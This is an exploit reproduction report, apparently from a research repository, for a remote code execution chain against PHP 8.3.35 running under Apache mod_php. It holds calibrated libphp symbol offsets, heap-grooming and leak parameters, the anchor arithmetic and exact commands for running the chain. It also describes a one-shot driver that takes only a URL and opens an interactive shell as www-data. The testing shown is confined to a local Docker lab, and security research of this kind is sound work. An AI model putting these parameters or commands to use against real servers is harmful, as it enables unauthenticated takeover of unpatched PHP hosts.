# PHP 8.3.35 mod_php — engine-level RCE (PHP2SHELL)

**Status: SOLID — reproduced.**
Command execution as `www-data` on stock `php:8.3.35-apache` (mod_php,
`php.ini-production`, 128M memory limit) through the pure-HTTP
CVE-2026-109618/109619 chain, with no plugins, no file writes before RCE,
and no credentials. 8.3.35 is the last affected 8.3 release, immediately
before the advisory's 8.3.36 fixed release.

| | |
|---|---|
| Target image | `php@sha256:c59c808172ee3672cd334f8f2a5d7b1480a9d7273a368f412b8ee9b4ef418184` (`php:8.3.35-apache`) |
| libphp.so SHA-256 | `ea069762fa225a2d61ebf613db5686d7c29823acf641424d596f78fcaa1cdccb` |
| Offsets | `zif_system=0x3AC080`, `zval_ptr_dtor=0x49EC50`, `php_session_reset_id=0x355B70` |
| Lab container | `p2s-8335`, `127.0.0.1:18138` |
| Apache | single worker (`StartServers 1`, `MaxRequestWorkers 1`, `ServerLimit 1`) |
| PHP config | stock `php.ini-production`, `memory_limit=128M`, `post_max_size=8M`, `session.upload_progress` enabled |
| Date | 2026-10-23 |

## Verdict

The 8.3.35 profile is proven end-to-end. The 8.3.29 heap geometry transfers
unchanged; only the symbol offsets moved. Ten chain executions across six
ASLR layouts returned command output. Nine of the ten succeeded on the first
chain attempt; the one exception was the first B1 of the initial container,
which returned 0 bytes and succeeded on the immediate retry after Apache
respawned the child. The URL-only driver auto-selected the new 8.3.35
profile from the `X-Powered-By` banner and ran the proof plus two further
commands in one session.

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux 5.15.153.1-microsoft-standard-WSL2
www-data
```

## Proof runs

| # | Context | Command | Output | Evidence |
|---|---|---|---|---|
| 1 | initial container; first B1 0 B, immediate retry | `id` | `uid=33(www-data) ...` | `evidence/chain-8335-try1.log`, `evidence/proof-run1-id.txt` |
| 2 | fresh ASLR 1 | `id` | `uid=33(www-data) ...` | `evidence/chain-8335-fresh1.log`, `evidence/proof-run2-id.txt` |
| 3 | fresh ASLR 2 | `id` | `uid=33(www-data) ...` | `evidence/chain-8335-fresh2.log`, `evidence/proof-run3-id.txt` |
| 4 | fresh ASLR 3 | `uname -sr` | `Linux 5.15.153.1-microsoft-standard-WSL2` | `evidence/chain-8335-fresh3.log`, `evidence/proof-run4-uname.txt` |
| 5 | fresh ASLR 4 | `whoami; ls -la /out` | `www-data` + proof dir listing | `evidence/chain-8335-fresh4.log`, `evidence/proof-run5-whoami-ls.txt` |
| 6 | fresh ASLR 5 | `id` | `uid=33(www-data) ...` | `evidence/chain-8335-fresh5.log`, `evidence/proof-run6-id.txt` |
| 7 | same child as #6, no restart | `echo chain2` | `chain2` | `evidence/repeat-8335-chain2.log`, `evidence/proof-repeat-chain2.txt` |
| 8 | URL-only driver, profile proof | `id` | `uid=33(www-data) ...` | `evidence/oneshot-8335-session.log`, `evidence/proof-oneshot-id.txt` |
| 9 | URL-only driver, interactive | `id` | `uid=33(www-data) ...` | `evidence/oneshot-8335-session.log`, `evidence/proof-oneshot-interactive-id.txt` |
| 10 | URL-only driver, interactive | `uname -sr` | `Linux 5.15.153.1-microsoft-standard-WSL2` | `evidence/oneshot-8335-session.log`, `evidence/proof-oneshot-uname.txt` |

Runs 8–10 reused one child (same ASLR addresses for all three chains),
confirming the heap stays usable between consecutive full chains. Run 1
also reused a child across the failed B1 and the successful retry; the
later runs show that a fresh child normally succeeds on the first attempt.

## Chain parameters (8.3.35)

| Stage | Parameter | Value |
|---|---|---|
| Offsets | `zif_system` | `libphp + 0x3AC080` |
| | `zval_ptr_dtor` | `libphp + 0x49EC50` |
| | `php_session_reset_id` | `libphp + 0x355B70` |
| A1 | `PHP_SESSION_UPLOAD_PROGRESS` length | `1000` |
| B1 | field spec | `G:300:0xE2 ×16 + X:900` |
| | forged `zend_string` length | `0xC8000` |
| | intra-page offset of forged header | `0x968` |
| | decoded leak window | `819208` bytes |
| | valid `Set-Cookie` size | ~1.25–1.27 MB |
| S | anchor | `S = (zval_ptr_dtor & ~0x1FFFFF) - 0x2000000 + 0xF9398` |
| | carrier chunk | `(zval_ptr_dtor & ~0x1FFFFF) - 0x2000000` |
| | fake HashTable offset in chunk | `0xF9398` (second copy `+0x1C0`, harmless) |
| A2 | cheap-OOM grooming | `parts=880`, `depth=64`, `fillers=115` |
| B2 | fake `zend_reference` | `vl=384`, `n1=500`, `n2=495`, `rc=1` |

The A2/B2 settings are the unchanged 8.3.29 defaults. The 8.3.35 run only
changed the three symbol offsets.

### Offset delta from 8.3.29

| Symbol | 8.3.29 | 8.3.35 | Delta |
|---|---|---|---|
| `zif_system` | `0x3ABDC0` | `0x3AC080` | `+0x2C0` |
| `zval_ptr_dtor` | `0x49DB50` | `0x49EC50` | `+0x1100` |

The heap geometry did not move: the same A1 progress length, B1 spec,
`page_off`, `fake_len`, and dtor-anchor relation worked without a gdb
recalibration. All leak runs produced the same bucket shape
(`3527 / 1168 / 165` pointers), with the 165-pointer bucket as the dead
main candidate and `zval_ptr_dtor`'s 2 MB bucket as the carrier anchor.

### Why the dtor anchor

On 8.3 the leak's high-count "main candidate" (the 165-pointer bucket)
points into a chunk that is unmapped after the request; anchoring `S`
there misses. `zval_ptr_dtor` is always present in the leak window, so its
2 MB bucket is used as the heap-chunk origin instead. From the initial
leak:

```
zval_ptr_dtor = 0x7f0077d27c50  -> libphp = 0x7f0077889000
dtor bucket   = 0x7f0077c00000
carrier chunk = 0x7f0077c00000 - 0x2000000 = 0x7f0075c00000
S             = 0x7f0075c00000 + 0xF9398   = 0x7f0075cf9398
```

## Operational notes

- **Leak reliability.** A valid B1 returns a 200 with a ~1.26 MB
  `Set-Cookie` and `decoded=819208`. Invalid windows carry no usable
  libphp pointers; the Linux page-alignment sanity check rejects a
  non-page-aligned base and the chain retries instead of continuing with
  junk.
- **Initial B1 0-byte retry.** The first chain attempt in the initial
  container completed A1 but the B1 response was 0 bytes. Apache respawned
  the child and the retry succeeded. This matches the 8.3.29 behavior; the
  driver's retry loop absorbs it.
- **Duplicate leak hazard.** On 8.3, a standalone A1+B1 leak followed by
  another A1+B1 without an intervening A2/B2 can abort the child
  (`zend_mm_heap corrupted`, SIGABRT). The URL-only driver validates the
  profile by running the first full chain, never a standalone leak.
- **Driver profile.** `oneshot/exploit.py` now carries
  `PROFILES["8.3.35"]`, maps `8.3.35` to it, and includes it in
  `CALIBRATED_BUILDS`. The 8.3.36 gate is unchanged.

## Reproduction

Raw chain (local lab):

```sh
./run.sh
SPEC=$(python3 -c "print(','.join(['G:300:0xE2']*16+['X:900']))")
python3 ../oneshot/pure_shell.py \
  --host 127.0.0.1 --port 18138 --path /index.php --outdir ./out \
  --zif 0x3ac080 --dtor 0x49ec50 --a1-progress 1000 \
  --b1-fake-len 0xC8000 --b1-spec "$SPEC" --b1-page-off 0x968 \
  --s-mode dtor --dtor-anchor=-0x2000000 --fake-array-delta 0xF9398 \
  --exec 'id'
```

URL-only one-shot (only input is the URL; further lines are commands):

```sh
printf 'http://127.0.0.1:18138/index.php\nid\nuname -sr\nexit\n' | \
  P2S_OUTDIR=$PWD/out python3 ../oneshot/exploit.py
```

Refresh ASLR between chains with `docker restart p2s-8335` (or pass
`--restart p2s-8335` to `pure_shell.py`).

## Files

- `lab-8335/run.sh` — lab bootstrap (image, single-worker Apache, `/out` mount)
- `lab-8335/offsets.sh` — `libphp.so` symbol extraction
- `lab-8335/evidence/symbols.txt` — recorded offsets
- `lab-8335/evidence/image-digest.txt` — image identity
- `lab-8335/evidence/libphp-sha256.txt` — engine identity (the binary is derived from the recorded image digest and is not committed)
- `lab-8335/evidence/` — chain logs and extracted proof files
- `oneshot/exploit.py` — URL-only driver, `PROFILES["8.3.35"]`, banner selection
- `oneshot/pure_shell.py` — engine (`--s-mode dtor`, `--dtor-anchor`, `--b1-page-off`)

Scope: local Docker lab only. 8.3.36 is the first fixed 8.3 release and is
gated by the driver; no dedicated fixed-build negative-control lab is
included in this repository. The 8.2.35, 8.4.27, and 8.5.12 boundaries are
likewise gate-only.
